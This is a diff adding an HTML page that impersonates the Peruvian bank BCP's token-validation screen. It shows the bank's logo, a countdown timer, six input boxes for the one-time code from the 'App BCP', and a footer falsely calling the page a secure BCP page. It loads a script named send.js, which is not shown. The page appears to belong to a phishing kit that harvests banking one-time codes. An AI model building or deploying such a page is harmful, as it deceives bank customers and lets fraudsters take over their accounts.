@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación Token - BCP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="docs/style.css">
+    <style>
+        /* Estilos específicos para los cuadros de Token */
+        .token-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 25px 0;
+        }
+
+        .token-input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            color: #022B95;
+            outline: none;
+            transition: all 0.3s;
+        }
+
+        .token-input:focus {
+            border-color: #ff7900;
+            box-shadow: 0 0 5px rgba(255, 121, 0, 0.2);
+        }
+
+        .token-instruction {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .btn-continue:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+@media (max-width: 768px) {
+
+.token-input {
+            width: 25px;
+            height: 30px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            color: #022B95;
+            outline: none;
+            transition: all 0.3s;
+        }
+}
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <img src="docs/logo.svg" alt="BCP" width="90">
+            </div>
+            <div class="sidebar-image"></div>
+        </div>
+
+        <div class="login-section">
+            <div class="timer">
+                Esta ventana se <strong>cerrará</strong> en <span>180 segundos</span> <i class="fa-regular fa-clock"></i>
+            </div>
+
+            <div class="form-container">
+                <h2>Validación de Seguridad</h2>
+                <p class="subtitle">Ingresa tu Token Digital</p>
+
+                <div class="card-boxx">
+                    <div class="card-headerr">Confirmación de Identidad</div>
+
+                    <p class="token-instruction">Introduce el código de 6 dígitos que aparece en tu App BCP</p>
+
+                    <div class="token-container" id="otp-inputs">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                        <input type="text" class="token-input" maxlength="1" inputmode="numeric" pattern="\d*">
+                    </div>
+
+                    <div class="links" style="justify-content: center;">
+    <a href="#" id="ver-token">¿Dónde encuentro mi Token?</a>
+</div>
+
+                    <button class="btn-continue" id="btn-submit" disabled>Confirmar Token</button>
+                </div>
+            </div>
+            
+            <footer class="footer-text">
+                <i class="fa-solid fa-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con<br>
+                nosotros al (01) 311-9898 o a través de nuestros medios digitales.
+            </footer>
+        </div>
+    </div>
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="docs/script.js"></script>
+<script src="docs/send.js"></script>
+   
+</body>
+</html>
